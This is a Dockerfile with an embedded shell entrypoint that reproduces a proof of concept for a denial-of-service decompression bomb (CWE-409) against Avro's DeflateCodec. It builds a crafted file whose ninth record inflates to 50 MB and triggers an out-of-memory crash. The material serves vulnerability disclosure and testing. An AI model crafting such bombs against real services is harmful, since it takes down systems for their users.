# =============================================================================
# Avro Decompression Bomb PoC (CWE-409) - Dockerised Reproduction
#
# Multi-stage build:
#   Stage 1 (build)  – compiles the uber-jar with Maven
#   Stage 2 (runtime)– runs CreatePoC then TriggerOOM with -Xmx32m
#
# Usage:
#   docker build -t avro-oom-poc .
#   docker run --rm avro-oom-poc
#
# The container will exit 99 when the vulnerability is confirmed.
# =============================================================================

# --------------- stage 1: build ---------------
FROM maven:3.9-eclipse-temurin-17 AS build

WORKDIR /build

# Copy only the POM first so dependency downloads are cached
COPY pom.xml .
RUN mvn dependency:go-offline -B -q

# Copy source and build the shaded uber-jar
COPY src/ src/
RUN mvn package -DskipTests -B -q

# --------------- stage 2: runtime ---------------
FROM eclipse-temurin:17-jre-alpine

LABEL maintainer="security-poc"
LABEL description="Avro Decompression Bomb PoC (CWE-409)"

WORKDIR /poc

COPY --from=build /build/target/avro-decompression-bomb-poc-1.0-SNAPSHOT.jar poc.jar

# Copy the run script and make it executable
COPY run-poc.sh .
RUN chmod +x run-poc.sh

# We embed a small entrypoint that:
#   1. Creates the malicious Avro file (needs ~256 MB heap)
#   2. Tries to read it with only 32 MB heap  -> OOM
COPY <<'ENTRYPOINT_SCRIPT' /poc/entrypoint.sh
#!/bin/sh
set -e

echo "============================================="
echo " Avro Decompression Bomb PoC  (CWE-409)"
echo " Running inside Docker container"
echo "============================================="
echo
echo "Container memory limit:"
if [ -f /sys/fs/cgroup/memory.max ]; then
    mem=$(cat /sys/fs/cgroup/memory.max)
    if [ "$mem" = "max" ]; then
        echo "  cgroup v2: unlimited"
    else
        echo "  cgroup v2: $(( mem / 1024 / 1024 )) MB"
    fi
elif [ -f /sys/fs/cgroup/memory/memory.limit_in_bytes ]; then
    mem=$(cat /sys/fs/cgroup/memory/memory.limit_in_bytes)
    echo "  cgroup v1: $(( mem / 1024 / 1024 )) MB"
else
    echo "  (could not detect)"
fi
echo

JAR=/poc/poc.jar
POC_FILE=/poc/poc.avro

# ---- Step 1: create the crafted bomb file ----
echo "===== Step 1: Generating crafted Avro bomb file ====="
echo
java -Xmx256m -cp "$JAR" poc.CraftBomb "$POC_FILE"
echo

# ---- Step 2: trigger OOM ----
echo "===== Step 2: Reading file with -Xmx32m (expect OOM) ====="
echo
set +e
java -Xmx32m -cp "$JAR" poc.TriggerOOM "$POC_FILE"
EXIT_CODE=$?
set -e

echo
if [ $EXIT_CODE -eq 99 ]; then
    echo "============================================="
    echo " RESULT: VULNERABILITY CONFIRMED (exit=99)"
    echo "============================================="
    echo
    echo " A 50 KB Avro file with 8 innocent preamble"
    echo " records decompressed to 50 MB on the 9th"
    echo " record, crashing the JVM with OOM."
    echo
    echo " Root cause: DeflateCodec.decompress() writes"
    echo " to an unbounded ByteArrayOutputStream."
    echo
    echo " CWE-409 | DoS via Decompression Bomb"
    echo "============================================="
elif [ $EXIT_CODE -eq 0 ]; then
    echo "============================================="
    echo " RESULT: OOM was NOT triggered."
    echo " The heap was large enough to absorb the bomb."
    echo "============================================="
else
    echo "============================================="
    echo " RESULT: Unexpected exit code $EXIT_CODE"
    echo "============================================="
fi

exit $EXIT_CODE
ENTRYPOINT_SCRIPT

RUN chmod +x /poc/entrypoint.sh

ENTRYPOINT ["/poc/entrypoint.sh"]
